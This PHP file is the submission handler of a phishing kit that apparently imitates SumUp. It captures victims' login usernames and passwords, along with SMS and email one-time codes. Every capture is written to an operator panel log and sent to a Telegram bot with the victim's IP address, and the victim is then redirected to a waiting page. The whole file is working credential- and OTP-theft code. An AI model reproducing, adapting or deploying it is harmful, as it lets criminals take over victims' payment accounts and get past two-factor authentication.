<?php
include_once '../main.php';
include_once './config.php';

$bot = $a_bot;
$ids = explode(",", str_replace(" ", "", $a_ids));

$ip = $_SERVER['REMOTE_ADDR']; // moved up before using in $panel

$panel = str_replace('web/send.php', '', "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

// Helper: safely get POST data
function post($data) {
    if (empty(trim($data))) {
        return "NO_DATA";
    } else {
        return htmlspecialchars($_POST[$data]);
    }
}

// Telegram sender – defined once
function sendTelegram($message, $bot_token, $chat_id) {
    if (empty($message)) $message = "Empty message";
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// -------- HANDLE LOGIN (username/password) --------
if (isset($_POST['username'])) {
    $username = post("username");
    $password = post("password");

    $telegram_content = "
SUMUP  / $ip
 lOGIN
 |📧 : $username
 |🔐 : $password
 └🌐 : $panel
    ";

    // Save to panel
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs . "\n+ Login: [ $username |  $password ] ";
    $arr = array("LOGS" => $newlogs);
    $m->update($arr);

    // Send to Telegram
    sendTelegram($telegram_content, $bot_token, $rez_chat);

    // Redirect and stop
    header("location: ./load.php");
    exit;
}

// -------- HANDLE SMS OTP (field '1') --------
if (isset($_POST['1'])) {
    $o2 = post('2');
    $o3 = post('3');
    $o4 = post('4');
    $o5 = post('5');
    $o6 = post('6');
    $o1 = post("1");
    $otp_code = $o1 . $o2 . $o3 . $o4 . $o5 . $o6;

    $telegram_content = "
SUMUP / $ip
 SMS OTP 
 |📟 $otp_code
 └🌐 : $panel ";

    // Save to panel
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs . "\n+ SMS [ $otp_code ]";
    $arr = array("LOGS" => $newlogs);
    $m->update($arr);

    // Send to Telegram
    sendTelegram($telegram_content, $bot_token, $rez_chat);

    header("location: ./load.php");
    exit;
}

// -------- HANDLE MAIL OTP (field '11') --------
if (isset($_POST['11'])) {
    $s2 = post('12');
    $s3 = post('13');
    $s4 = post('14');
    $s5 = post('15');
    $s6 = post('16');
    $s1 = post("11");
    $mail = $s1 . $s2 . $s3 . $s4 . $s5 . $s6;

    $telegram_content = "
SUMUP / $ip
 MAIL OTP 
 |📟 $mail
 └🌐 $panel
    ";

    // Save to panel
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs . "\n+ email otp code [ $mail ]";
    $arr = array("LOGS" => $newlogs);
    $m->update($arr);

    sendTelegram($telegram_content, $bot_token, $rez_chat);

    header("location: ./load.php");
    exit;
}

// If none of the above, redirect to load.php anyway (fallback)
header("location: ./load.php");
exit;
?>